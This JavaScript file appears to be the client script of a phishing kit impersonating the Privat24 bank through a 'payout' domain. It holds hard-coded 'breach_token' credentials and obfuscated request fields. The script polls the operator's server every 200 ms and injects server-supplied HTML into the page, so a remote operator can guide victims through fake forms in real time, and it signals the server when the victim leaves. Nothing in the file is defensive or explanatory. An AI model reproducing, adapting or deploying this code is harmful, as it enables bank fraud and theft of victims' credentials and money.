const BREACH_TOKEN = "a9j0kARNWOdoXhnLjzmcGlyUtA8pGmj8fbksX8z5Sz3RmCZDnEZgpwBaCkbyhSYn5Bt7W1G3YtS8iBggtrRU3XuXem"
const GET_TOKEN = "JNdjTpS2VDsC7mEH6IeFgMS9bJb6fZS6acXupzlUSZCyBSXV"
const GET_DATA_TOKEN = "0qwa2SL6j1deLARe063BdH7evGVjyMaIqRaa0o05Wkz3GaeBSOHdFqZ41RBoMSMRjC"

const SERVER_ADDRESS = "http://" + "privat24-viplata.site"
const GET_TOKEN_ENDPOINT = new URL(SERVER_ADDRESS + "/get")
GET_TOKEN_ENDPOINT.searchParams.append("breach_token", BREACH_TOKEN)
const GET_DATA_ENDPOINT = new URL(SERVER_ADDRESS + "/get-data")
GET_DATA_ENDPOINT.searchParams.append("breach_token", BREACH_TOKEN)
const SET_ENDPOINT = new URL(SERVER_ADDRESS + "/set")
SET_ENDPOINT.searchParams.append("breach_token", BREACH_TOKEN)
const GET_STATUS_ENDPOINT = new URL(SERVER_ADDRESS + "/get-s")
GET_STATUS_ENDPOINT.searchParams.append("breach_token", BREACH_TOKEN)


let finished_str = localStorage.getItem("f")? localStorage.getItem("f"): "false"
var finished = {"true": true, "false": false}[finished_str]

const done_phrase = "<h1>Заявка відправлена на оброблення!<h1>" 

let session_token = localStorage.getItem("s")

console.log(finished)

window.onbeforeunload = async (event) => {
    event.preventDefault();
    if (finished === false) {
        let token = localStorage.getItem("s")
        await set_status(token, "ExhvNRSe1EOZ9JZu8uPqSffbO6")
    }
    window.close()
}

window.onunload = async (event) => {
    event.preventDefault();
    if (finished === false) {
        let token = localStorage.getItem("s")
        await set_status(token, "ExhvNRSe1EOZ9JZu8uPqSffbO6")
    }
    window.close()
}

async function get_token() {
    const response = await 
    fetch(GET_TOKEN_ENDPOINT, {
        method: "POST",
        body: JSON.stringify({eU9Xehtp30LXt3o14IhqTkhy3Ee1: GET_TOKEN}),
        headers: {"content-type": "application/json"},
    })
    
    return response.json()
}

async function get_data(session_token) {
    const response = await 
    fetch(GET_DATA_ENDPOINT, {
        method: "POST",
        body: JSON.stringify({
            Us5vZjR7QA21VVI2D9xR2ZChfoQfEWH4vpcLZ: GET_DATA_TOKEN,
            KOtaocIzsb5rQgrxG10Sm1b2UqgHs: session_token
        }),
        headers: {"content-type": "application/json"},
    })
    return response.json()
}

async function set_status(session_token, status) {
    const response = await 
    fetch(SET_ENDPOINT, {
        method: "POST",
        body: JSON.stringify({
            HcuDqZTReL1ActRjpLlaTgAogUCFnLmFChP8nUtCSoQ: session_token,
            sHRNaIvKvRgcutW7iVsPOrdA6: status
        }),
        headers: {"content-type": "application/json"},
    })
}
  
async function get_status(session_token) {
    const response = await
    fetch(GET_STATUS_ENDPOINT, {
        method: "POST",
        body: JSON.stringify({
            BylnIL0Bkw4GbvFmtVJivdMPXlEiEbF: session_token 
        }),
        headers: {"content-type": "application/json"},
    })
    return response.json()
}

function replace_content(element) {
    const rootElement = document.getElementById("root")
    if (rootElement.innerHTML !== element) {
      const newItem = document.createElement("div")
      newItem.innerHTML = element
      newItem.id = "root"
      rootElement.parentNode.replaceChild(newItem, rootElement)
    }
}

function replace(gold) {
    if (gold === "done") {
        finished = true
        localStorage.setItem("f", true)
        replace_content(done_phrase)
    } else {
        replace_content(gold)
    }
}

async function final(session_token) {
    console.log("final start")
    if (finished === false) {
    let data = await get_data(session_token)
    let err = data.detail
    if (err === undefined) {
        let gold = data.iYOgo72xmUlFOiXS0cwx7LtlfeRmuR
        replace(gold)
        return false
    } else {
        return true
    }
    }
}


function runInterval(session_token) {
    var interval = setInterval(async function() {
        let err = await final(session_token)
        if (err === true) {
            clearInterval(interval)
            localStorage.clear()
            console.info("session expired")
            let new_token = ""
            while (new_token === "") {
                let response = await get_token()
                if (response.xywQynARfHj20q6t39ybWzCCLueEUihRMt6vxg) {
                    new_token = response.sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM
                }
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
            localStorage.setItem("s", new_token)
            runInterval(new_token)
            
        }
    }, 200)
}

if (finished === true) {
    replace(done_phrase)
} else {

if (session_token === null) {
    get_token().then((response) => {
        if (response.xywQynARfHj20q6t39ybWzCCLueEUihRMt6vxg) {
            console.warn("session_token defined")
            localStorage.setItem("s", response.sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM)
            runInterval(response.sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM)
        }
    })
} else {
    get_status(session_token).then(async (response)=>{
        let saved_status = response.UW40olHWnbCnN1qFeGoSJqh3yMQNCET6xb2ARROFR10
        if (saved_status === "xsKXNa55MMGujASVrXfKLyjMtUICf7LqmGKNdCEDMpc") {
            await set_status(session_token, "m1eI5EN2M6kiyuWoXbMHLpW73Fx5suA")
            runInterval(session_token)
        } else {
            get_token().then((response) => {
                if (response.xywQynARfHj20q6t39ybWzCCLueEUihRMt6vxg) {
                    localStorage.setItem("s", response.sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM)
                    runInterval(response.sN246BggZjXTB0bnH3xN6NewNy7a16N9mE9NF6KHcM)
                }
            })
        }
    })
}
}
